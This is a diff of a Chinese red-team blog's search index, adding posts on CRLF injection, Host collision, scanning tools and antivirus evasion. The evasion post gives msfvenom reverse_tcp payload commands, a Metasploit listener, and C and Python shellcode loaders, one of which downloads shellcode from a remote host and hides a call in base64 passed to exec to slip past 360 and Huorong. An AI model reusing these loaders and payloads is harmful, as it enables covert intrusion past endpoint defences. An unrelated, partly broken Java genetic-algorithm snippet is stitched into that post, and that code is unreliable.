@@ -1,24 +1,27 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Host碰撞</title>
-    <url>/2022/09/03/Host%E7%A2%B0%E6%92%9E/</url>
-    <content><![CDATA[<p><strong>0x01 Host碰撞</strong></p>
-<p>在某些时候我们用IP访问时，目标资产响应多为: 401、403、404、500，但是用域名请求却能返回正常的业务系统，这是因为大多数系统都会需要绑定域名才能访问，<strong>而且这种情况默认是在内网访问</strong>。</p>
-<p>举个例子就懂了，网站对外主域名为<a href="http://www.test.com,而内网中存在多个业务系统,皆有绑定内网域名,比如manage.test.com,这是内网自定义的域名,无法在公网dns解析到,即不是备案过的子域名,无法直接访问到,因为公网无法解析其ip./">www.test.com，而内网中存在多个业务系统，皆有绑定内网域名，比如manage.test.com，这是内网自定义的域名，无法在公网DNS解析到，即不是备案过的子域名，无法直接访问到，因为公网无法解析其IP。</a></p>
-<p><img src="/.com//403.png" alt="img"></p>
-<img src="/.com//09/03/Host%E7%A2%B0%E6%92%9E/403.png" class width="403">
+    <title>CRLF注入漏洞</title>
+    <url>/2022/09/03/CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<p><strong>0x01 CRLF注入漏洞</strong></p>
+<p>回车换行（CRLF）注入攻击是一种当用户将CRLF字符插入到应用中而触发漏洞的攻击技巧。CRLF字符（%0d%0a）在许多互联网协议中表示行的结束，包括HTML，该字符解码后即为\ r\ n。这些字符可以被用来表示换行符，并且当该字符与HTTP协议请求和响应的头部一起联用时就有可能会出现各种各样的漏洞，包括http请求走私（HTTP RequestSmuggling）和http响应拆分（HTTP Response Splitting）。</p>
+<p>一般有两种应用场景：</p>
+<p>1、注入请求头导致html解析</p>
+<p>2、注入操作日志导致后台日志记录混淆，比如恶意换行</p>
+<p><strong>0x02 CRLF注入检测原理</strong></p>
+<p>简单来讲就是在构造请求时，加上%0d%0a字符，验证后续代码能否被单独解析执行，如下测试代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET url=https://www.test.com%0d%0a%0d%0a&lt;img src=1 onerror=alert(/xss/)&gt;/</span><br><span class="line">Host:xxx</span><br></pre></td></tr></table></figure>
 
-<p>系统管理员其实是这样配置的，利用apache或nginx进行配置配置，使无法直接通过IP去访问系统，有因为公网DNS无法解析自定义子域名，因此访问系统有两个条件，即知道系统的内网域名和对应的IP，利用本地DNS解析即可访问。</p>
-<p><strong>0x02 DNS缓存</strong></p>
-<p>简单说明下DNS解析机制。当我们访问某个域名时，会解析到对应的IP去访问业务系统，大致顺序如下：</p>
-<p>1、浏览器缓存，先检查自身缓存中有没有被解析过的这个域名对应的ip地址。<br>2、本地缓存hosts文件，在C盘系统文件下有个hosts文件，记录域名和对应的IP地址（此步就是hosts碰撞的修改点）<br>3、本区域域名服务器(LDNS)，即你所在或附近城市的域名服务器，大约80%的域名解析到这里就完成了。<br>4、再高一级域名服务器，如果还是解析不到就继续往上一级查，此处就不赘述了。</p>
-<p>hosts碰撞原理如下图。此处的本地DNS解析可以在hosts文件配置。知道了原理，我们就可以收集内网系统的域名和目标资产的IP段，将两者进行组合遍历，便可发现一些暴露在公网的内网资产了。</p>
-<p><strong>0x03 批量检测</strong></p>
-<p>这里是推荐一个批量发现工具，针对hosts碰撞批量发现。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/fofapro/Hosts_scan</span><br></pre></td></tr></table></figure>
+<p>如果存在CRLF注入漏洞会被解析为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET url=https://www.test.com</span><br><span class="line">&lt;img src=1 onerror=alert(/xss/)&gt;/</span><br><span class="line">Host:xxx</span><br></pre></td></tr></table></figure>
 
-<p>把IP列表放在ip.txt，把某系统的可能的子域名或是内网域名放在host.txt，工具截图如下：</p>
+<p>从而造成XSS</p>
+<p><strong>0x03 CRLF注入自动化检测</strong></p>
+<p>自动化检测工具地址：<a href="https://github.com/Nefcore/CRLFsuite">https://github.com/Nefcore/CRLFsuite</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git clone https://github.com/Nefcore/CRLFsuite.git</span><br><span class="line">$ cd CRLFsuite</span><br><span class="line">$ sudo python3 setup.py install</span><br><span class="line">$ crlfsuite -h</span><br></pre></td></tr></table></figure>
+
+<p>用法：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">单网址扫描：</span><br><span class="line">$ crlfsuite -u &quot;http://testphp.vulnweb.com&quot;</span><br><span class="line"></span><br><span class="line">多个 URL 扫描：：</span><br><span class="line">$ crlfsuite -i targets.txt</span><br><span class="line"></span><br><span class="line">从标准输入：</span><br><span class="line">$ subfinder -d google.com -silent | httpx -silent | crlfsuite -s</span><br><span class="line"></span><br><span class="line">指定 cookie扫描：</span><br><span class="line">$ crlfsuite -u &quot;http://testphp.vulnweb.com&quot; --cookies &quot;key=val; newkey=newval&quot;</span><br><span class="line"></span><br><span class="line">使用 POST 方法：	</span><br><span class="line">$ crlfsuite -i targets.txt -m POST -d &quot;key=val&amp;newkey=newval&quot;</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>红队</category>
@@ -28,9 +31,240 @@
       </tags>
   </entry>
   <entry>
+    <title>Host碰撞</title>
+    <url>/2022/09/03/Host%E7%A2%B0%E6%92%9E/</url>
+    <content><![CDATA[<p><strong>0x01 Host碰撞</strong></p>
+<p>在某些时候我们用IP访问时，目标资产响应多为: 401、403、404、500，但是用域名请求却能返回正常的业务系统，这是因为大多数系统都会需要绑定域名才能访问，<strong>而且这种情况默认是在内网访问</strong>。</p>
+<p>举个例子就懂了，网站对外主域名为<a href="http://www.test.com,而内网中存在多个业务系统,皆有绑定内网域名,比如manage.test.com,这是内网自定义的域名,无法在公网dns解析到,即不是备案过的子域名,无法直接访问到,因为公网无法解析其ip./">www.test.com，而内网中存在多个业务系统，皆有绑定内网域名，比如manage.test.com，这是内网自定义的域名，无法在公网DNS解析到，即不是备案过的子域名，无法直接访问到，因为公网无法解析其IP。</a></p>
+<img src="/2022/09/03/Host%E7%A2%B0%E6%92%9E/403.png" class title="This is an example image">
+
+<p>系统管理员其实是这样配置的，利用apache或nginx进行配置配置，使无法直接通过IP去访问系统，有因为公网DNS无法解析自定义子域名，因此访问系统有两个条件，即知道系统的内网域名和对应的IP，利用本地DNS解析即可访问。</p>
+<p><strong>0x02 DNS缓存</strong></p>
+<p>简单说明下DNS解析机制。当我们访问某个域名时，会解析到对应的IP去访问业务系统，大致顺序如下：</p>
+<p>1、浏览器缓存，先检查自身缓存中有没有被解析过的这个域名对应的ip地址。<br>2、本地缓存hosts文件，在C盘系统文件下有个hosts文件，记录域名和对应的IP地址（此步就是hosts碰撞的修改点）<br>3、本区域域名服务器(LDNS)，即你所在或附近城市的域名服务器，大约80%的域名解析到这里就完成了。<br>4、再高一级域名服务器，如果还是解析不到就继续往上一级查，此处就不赘述了。</p>
+<p>hosts碰撞原理如下图。此处的本地DNS解析可以在hosts文件配置。知道了原理，我们就可以收集内网系统的域名和目标资产的IP段，将两者进行组合遍历，便可发现一些暴露在公网的内网资产了。</p>
+<img src="/2022/09/03/Host%E7%A2%B0%E6%92%9E/hosts%E7%A2%B0%E6%92%9E.png" class title="This is an example image">
+
+
+
+<p><strong>0x03 批量检测</strong></p>
+<p>这里是推荐一个批量发现工具，针对hosts碰撞批量发现。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/fofapro/Hosts_scan</span><br></pre></td></tr></table></figure>
+
+<p>把IP列表放在ip.txt，把某系统的可能的子域名或是内网域名放在host.txt，工具截图如下：</p>
+<img src="/2022/09/03/Host%E7%A2%B0%E6%92%9E/ok.png" class title="This is an example image">]]></content>
+      <categories>
+        <category>红队</category>
+      </categories>
+      <tags>
+        <tag>常用渗透点</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>企业与个人必备安全测试工具</title>
+    <url>/2022/09/03/%E4%BC%81%E4%B8%9A%E4%B8%8E%E4%B8%AA%E4%BA%BA%E5%BF%85%E5%A4%87%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/</url>
+    <content><![CDATA[<p><strong>0x01 Web漏洞扫描</strong></p>
+<ul>
+<li><p>Appsacn</p>
+<p>AppScan是IBM的一款web应用安全测试工具,能扫描和检测所有常见的 Web 应用安全漏洞，例如 SQL 注入（SQL-injection）、跨站点脚本攻击（cross-site scripting）、缓冲区溢出（buffer overflow）等。<strong>其漏洞扫描速度一般，准确率最高，漏洞规则库最全面。漏洞验证可查看请求相应代码，拥有较完整的漏洞修复建议。报表功能完整。</strong></p>
+</li>
+<li><p>AWVS</p>
+<p>自动化的web应用程序安全测试工具，可以扫描任何通过web浏览器访问的和遵循HTTP&#x2F;HTTPS规则的web站点和应用。<strong>漏洞扫描速度较快，准确率较高，漏洞规则库较为全面。漏洞验证可查看请求响应代码，报表功能完整。有多重漏洞的验证工具。</strong></p>
+</li>
+<li><p>Burp Suite 集成插件</p>
+<p>简单介绍几个常用检测插件：</p>
+<p>1、shiro漏洞检测</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/pmiaowu/BurpShiroPassiveScan</span><br></pre></td></tr></table></figure>
+
+<p>2、Struts2漏洞检测</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/prakharathreya/Struts2-RCE</span><br></pre></td></tr></table></figure>
+
+<p>3、Fastjson漏洞检测</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/p1g3/Fastjson-Scanner</span><br></pre></td></tr></table></figure>
+
+<p>下面是github上的burp漏洞插件检测列表，文末提供下载。</p>
+<img src="/2022/09/03/%E4%BC%81%E4%B8%9A%E4%B8%8E%E4%B8%AA%E4%BA%BA%E5%BF%85%E5%A4%87%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/burp%E6%8F%92%E4%BB%B6%E5%88%97%E8%A1%A8.png" class title="This is an example image"></li>
+</ul>
+<p><strong>0x02 第三方开源软件漏洞扫描</strong></p>
+<ul>
+<li><p>Application Inspector</p>
+<p>微软开源了快速检查第三方开源组件安全问题的命令行工具 Application Inspector，源代码采用MIT 许可证发布在软件巨人旗下的托管平台 GitHub 上。这个静态源代码分析工具用于帮助开发者在整合第三方开源组件时处理潜在的安全问题。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/microsoft/ApplicationInspector</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/09/03/%E4%BC%81%E4%B8%9A%E4%B8%8E%E4%B8%AA%E4%BA%BA%E5%BF%85%E5%A4%87%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/applocation_inspector.png" class title="This is an example image"></li>
+</ul>
+<p><strong>0x03 主机漏洞扫描</strong></p>
+<ul>
+<li><p>Nexpose</p>
+<p>由Rapid7开发，与Metasploit和Metasploit社区相同的开发人员组成。Nexpose 是一款极佳的漏洞扫描工具，跟一般的扫描工具不同，Nexpose自身的功能非常强大。可以<strong>更新其漏洞数据库</strong>，以保证最新的漏洞被扫描到。可以给出哪那些漏洞可以被Metasploit Exploit，哪些漏洞在Exploit-db里面有exploit的方案。可以生成非常详细的，非常强大的Report，涵盖了很多统计功能和漏洞的详细信息。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">下载地址：http://www.rapid7.com/vulnerability-scanner.jsp</span><br><span class="line">安装教程：https://blog.csdn.net/edu_aqniu/article/details/77989831</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>OpenVAS</p>
+<p>OpenVAS 是 Nessus 项目的一个开源分支，用于对目标系统进行漏洞评估和管理，OpenVAS 的配置使用相较于 Nessus 更加复杂，扫描速度也不如 Nessus ，但是胜在开源免费。相比于 Nessus ，OpenVAS 的漏洞评估更加侧重系统内部的漏洞，尤其是在 Linux 内核级的漏洞检测上尤为明显。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">官网地址：https://www.openvas.org/</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Nessus</p>
+<p>一款号称是世界上最流行的漏洞扫描程序，全世界有超过75000个组织在使用它。该工具提供完整的电脑漏洞扫描服务，并随时更新其漏洞数据库。Nessus不同于传统的漏洞扫描软件，Nessus可同时在本机或远端上遥控，进行系统的漏洞分析扫描。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">下载地址：https://www.tenable.com/downloads/nessus?loginAttempted=true</span><br><span class="line">安装教程：https://blog.csdn.net/weixin_41924764/article/details/109550459</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>0x04 数据库漏洞扫描</strong></p>
+<ul>
+<li><p>Scuba用于扫描数据库，查找<strong>安全漏洞</strong>和<strong>配置缺陷</strong>(包括修补级别)，其针对 Oracle Database、Microsoft SQL Server、SAP Sybase、IBM DB2、Informix 和 MySQL 提供了接近 1200 次评估测试。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">安装教程：(安装包文末提供)</span><br><span class="line">https://www.cnblogs.com/fsxsmile/p/14840028.html</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>0x05 Docker安全扫描</strong></p>
+<ul>
+<li><p>DockerScan</p>
+<p>专门对docker镜像安全测试的工具，采用python开发，支持敏感信息的扫描，例如：在环境变量中查找密码、尝试在环境变量中查找任何 URL&#x2F;IP、尝试推断内部用于运行软件的用户等。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/cr0hn/dockerscan</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>0x06 安卓APP漏洞扫描</strong></p>
+<ul>
+<li><p>QARK，该工具用于分析那些用Java语言开发的Android应用中的潜在安全缺陷。QARK 全称 Quick Android Review Kit。这个工具用来寻找与 Android 应用相关的安全漏洞，包括检查源代码和打包的 APKs。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/linkedin/qark</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>0x07 代码安全扫描</strong></p>
+<ul>
+<li><p>Fortify</p>
+<p>Fortify 全名叫：Fortify SCA ，是HP的产品 ，是一个静态的、白盒的软件源代码安全测试工具。将源代码中存在的安全漏洞扫描出来，并给予整理报告。扫描的结果包含详细的安全漏洞信息、安全知识说明、修复意见。<strong>支持的21种语言</strong>。文章最后附下载地址。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.shungg.cn/301.html</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>0x08 应用安全漏洞扫描</strong></p>
+<ul>
+<li><p>Webinspect主要是对Web应用程序进行网络应用安全测试和评估。它提供了快速扫描功能，并能进行广泛的安全评估，并给出准确的Web应用程序安全扫描结果。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.uedbox.com/post/6487/</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>0x09 项目依赖扫描</strong></p>
+<ul>
+<li><p>DependencyCheck用于识别项目依赖项并检查是否存在任何已知的，公开披露的漏洞。目前，已支持Java、.NET、Ruby、PHP、Node.js、Python等语言编写的程序，并为C&#x2F;C++构建系统（autoconf和cmake）提供了有限的支持。而且该工具还是OWASP Top 10的解决方案的一部分。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">工具链接：https://github.com/jeremylong/DependencyCheck</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./cli/target/release/bin/dependency-check.sh -h</span><br><span class="line">./cli/target/release/bin/dependency-check.sh  --project example --out . --scan ./src/test/resources</span><br></pre></td></tr></table></figure></li>
+</ul>
+]]></content>
+      <tags>
+        <tag>安全测试工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>免杀对抗之源码免杀</title>
+    <url>/2022/09/03/%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97%E4%B9%8B%E6%BA%90%E7%A0%81%E5%85%8D%E6%9D%80/</url>
+    <content><![CDATA[<p><strong>0x01 免杀分类</strong></p>
+<p>渗透测试中常需要免杀马，这块的内容交叉且形式多样。常见的免杀方式，源码混淆、DLL文件替换、文件修改、加壳、花指令免杀、签名等。免杀的内容比较偏向破解、反编译范畴的安全研究，也是武器库中的必不可少的部分。本文章是系列教程，各种免杀方式都会涉及，本次分享的是源码免杀。</p>
+<p><strong>0x02 源码免杀</strong></p>
+<p>这里以Python做免杀为例，其他语言如C#、GO、Ruby等免杀思路相同。</p>
+<p>免杀的大致步骤可以分为如下，视情况可以采用部分步骤：</p>
+<ul>
+<li>加载器选择-ctypes-DLL&amp;其他，加载shellcode的组件</li>
+<li>加密器选择-base64&amp;hex&amp;xor&amp;aes，加密shellcode的组件、异或</li>
+<li>执行器选择-github上不是一大堆，用于执行shellcode的组件</li>
+<li>打包器选择-pyinstaller&amp;py2exe，把代码打包成可执行文件的组件</li>
+</ul>
+<p>免杀思路一：msf生成C语言shellcode，编写C程序调用shellcode生成exe可执行文件</p>
+<p>其实这部分无作任何免杀，只是换了调用方式，但还是能过电脑管家的（无语）</p>
+<p>msf操作步骤：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#生成C语言shellcode，此处生成的shellcode是程序执行在内存中的状态</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=yourip lport=6688 -f c</span><br><span class="line">#监听主机上线</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 6688</span><br></pre></td></tr></table></figure>
+
+<p>C语言调用二进制生成exe代码（需要采用32位执行）：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//此代码用于将msf生成的shellcode打包生成exe</span></span><br><span class="line"><span class="comment">//可能有同学要问了，为什么生成C语言的二进制码还需要利用C语言打包执行。其实exe程序运行时在内存中是二进制码，现在msf生成的是二进制码，需要打包成exe才能被执行</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="comment">//windows控制台程序不出黑窗口</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) </span></span><br><span class="line"><span class="comment">//此处放msf生成的shellcode</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;shellcode&quot;</span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>* Memory;</span><br><span class="line">    <span class="comment">// 申请EXECUTE属性内存</span></span><br><span class="line">    Memory = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="comment">// 拷贝shellcode</span></span><br><span class="line">    <span class="built_in">memcpy</span>(Memory, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="comment">// 执行shellcode</span></span><br><span class="line">    ((<span class="type">void</span>(*)())Memory)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>免杀思路二：利用msf生成加密的C语言shellcode，再利用python去调用（免杀思路一是采用C语言调用）</p>
+<p>python采用ctypes模块引用&amp;执行C语言代码</p>
+<p>此处讲解个Python调用C语言生成的动态链接库的小案例：</p>
+<p>vs生成dll文件小tips:（生成解决方案）：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="type">void</span> <span class="title function_">TestCtypes</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;I like eating you\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>python采用ctypes调用生成的dll文件：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#加载Dll1.dll</span></span><br><span class="line">lib=CDLL(<span class="string">&#x27;./Dll1.dll&#x27;</span>)</span><br><span class="line"><span class="comment">#调用当前库方法</span></span><br><span class="line">lib.TestCtypes()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>此处打包器选择pyinstaller</p>
+<p>msf生成base64加密shellcode:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp --encrypt base64 lhost=47.94.236.117 lport=6688 -f c</span><br></pre></td></tr></table></figure>
+
+<p>python调用Ctypes模块解码调用shellcode（注：此处python必须为32位的）</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment">#此处为msf生成的加密shellcode,去掉&quot;和;</span></span><br><span class="line">encode_shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = base64.b64decode(encode_shellcode)</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行shellcode</span></span><br><span class="line">rwxpage = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>, <span class="built_in">len</span>(shellcode), <span class="number">0x1000</span>, <span class="number">0x40</span>)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), <span class="built_in">len</span>(shellcode))</span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, rwxpage, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(handle, -<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p>pyinstaller.exe -F -w miansha-df.py #用于将py文件生成exe文件  （注：此处python必须为32位的）</p>
+<p>免杀思路三：外部shellcode加载+特征语句定位加密（过hr、360）</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#外部请求shellcode</span></span><br><span class="line">encode_shellcode = requests.get(<span class="string">&quot;http://yourip/123.txt&quot;</span>).text</span><br><span class="line"><span class="comment">#解密shellcode</span></span><br><span class="line">shellcode = base64.b64decode(encode_shellcode)</span><br><span class="line"></span><br><span class="line">rwxpage = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>, <span class="built_in">len</span>(shellcode), <span class="number">0x1000</span>, <span class="number">0x40</span>)</span><br><span class="line"><span class="comment">#此处为ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), len(shellcode))原语句base64加密</span></span><br><span class="line">func=base64.b64decode(<span class="string">b&#x27;Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KHJ3eHBhZ2UsIGN0eXBlcy5jcmVhdGVfc3RyaW5nX2J1ZmZlcihzaGVsbGNvZGUpLCBsZW4oc2hlbGxjb2RlKSk=&#x27;</span>)</span><br><span class="line"><span class="built_in">exec</span>(func)</span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, rwxpage, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(handle, -<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>注意点：</p>
+<p>1.python执行C语言shellcode时需要使用python3 32位，打包成exe文件也需要使用32位的，win10上打包生成的exe在win7环境下会报错，要选择相应版本打包。</p>
+<p>2.msf生成shellcode时，有无base64加密生成的shellcode形式相似，类似”x2f\x4f\x69\x50\x41”</p>
+<p>​	2.1.本文中默认生成的shellcode是C语言shellcode码，是把byte码用十六进制来表示</p>
+<p>​	2.2.添加base64加密生成的是base64加密的shellcode，同样是把byte码用十六进制来表示。在调用时需要把十六进制转化为字符串，为了方便起见，免杀思路三中的放在服务器上的123.txt在十六进制转换的字符串，便于操作，否则需要本地再次转换。</p>
+<p>附带科普下，内存运行编码的各种概念。</p>
+<p>内存大小是使用byte为单位的，msf生成的byte码是执行在内存时的编码，为16进制，而python在打印时会自动将十六进制编码转换为字符串，下面的python代码打印的结果为AVlNXa。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test = <span class="string">&quot;\x41\x56\x6c\x4e\x58\x61&quot;</span></span><br><span class="line"><span class="built_in">print</span>(test)</span><br></pre></td></tr></table></figure>
+
+<p>0X1 &#x3D; 1byte<br>0X10 &#x3D; 16 byte<br>0X100 &#x3D; 16<em>16 byte &#x3D; 256 byte<br>0X1000 &#x3D; 16 <em>256 byte&#x3D; 4 * ( 4 * 256byte) &#x3D; 4 * 1024 byte &#x3D;4K byte<br>0X1 0000 &#x3D; 16 * 4K byte &#x3D; 64K byte<br>0X10 0000 &#x3D; 16 * 64K byte &#x3D; 1024K byte &#x3D; 1M byte<br>0X100 0000 &#x3D; 16 * 1M byte &#x3D; 16M byte<br>0X1000 0000 &#x3D; 16 * 16M byte &#x3D; 256M byte<br>0X1 0000 0000 &#x3D; 16 * 256Mbyte &#x3D; 4</em>(4</em>256) Mbyte &#x3D; 4*1024Mbyte&#x3D;4Gbyte</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Pop <span class="title function_">evPop</span><span class="params">(Pop pop, RuleBean rule)</span> &#123;</span><br><span class="line">	<span class="type">Pop</span> <span class="variable">new1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Pop</span>(pop.getLength());</span><br><span class="line">	<span class="type">int</span> elitismO;</span><br><span class="line">	<span class="keyword">if</span> (elitism) &#123;</span><br><span class="line">			elitismO = <span class="number">1</span>;</span><br><span class="line">			<span class="type">Paper</span> <span class="variable">fit</span> <span class="operator">=</span> pop.getFitness();</span><br><span class="line">			fit.setId(<span class="number">0</span>);</span><br><span class="line">			new1.setPaper(<span class="number">0</span>, fitness);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> elitismO; i &lt; new1.getLength(); i++) &#123;</span><br><span class="line">			<span class="type">Paper</span> <span class="variable">parent1</span> <span class="operator">=</span> select(pop);</span><br><span class="line">			<span class="type">Paper</span> <span class="variable">parent2</span> <span class="operator">=</span> select(pop);</span><br><span class="line">			<span class="keyword">while</span> (parent2.getId() == parent1.getId()) &#123;</span><br><span class="line">				parent2 = select(pop);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="type">Paper</span> <span class="variable">child</span> <span class="operator">=</span> crossover(parent1, parent2, rule);</span><br><span class="line">			child.setId(i);</span><br><span class="line">			newPopulation.setPaper(i, child);</span><br><span class="line">		&#125;</span><br><span class="line">    	Paper tmpPaper;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> elitismOffset; i &lt; newPopulation.getLength(); i++) &#123;</span><br><span class="line">			tmpPaper = new1.getPaper(i);</span><br><span class="line">			mutate(tmpPaper);</span><br><span class="line">			tmpPaper.setKpCoverage(rule);</span><br><span class="line">			tmpPaper.setAdaptationDegree(rule, Global.KP_WEIGHT, Global.DIFFCULTY_WEIGHt);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> new1;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>红队</category>
+      </categories>
+      <tags>
+        <tag>免杀</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>各代理工具及代理场景</title>
+    <url>/2022/09/03/%E5%90%84%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E5%8F%8A%E4%BB%A3%E7%90%86%E5%9C%BA%E6%99%AF/</url>
+    <content><![CDATA[<p>出于工作或是个人需求，有时候不想直接用真实的IP去访问某个网站，常用各种转发代理软件，给大家介绍下几种代理软件及特点和代理场景。</p>
+<p>代理简单来说有两种，一种是购买订阅链接，包含各个区域服务器的订阅，一般有多人使用，可能会比较卡。另一种是自己买VPS搭建，也就是搭建个人专用代理，把流量都转到服务器上。两者原理相同。</p>
+<p><strong>0x01.SSTap</strong></p>
+<p>这款软件怕不是大家都没怎么听过，原本是用于游戏代理的，现阶段已停止更新。推荐这款的理由是，其代理的方式是虚拟网卡代理，而不只是默认代理浏览器请求。</p>
+<p>这里举个例子好让大家理解，比如常用的ShadowsocksR，其中有个全局代理，但其实只是伪全局，就是说，你通过其他客户端软件，命令行运行的脚本等等，都是不走代理的。对于某些安全测试来说，这可是天差地别，懂的都懂哈。</p>
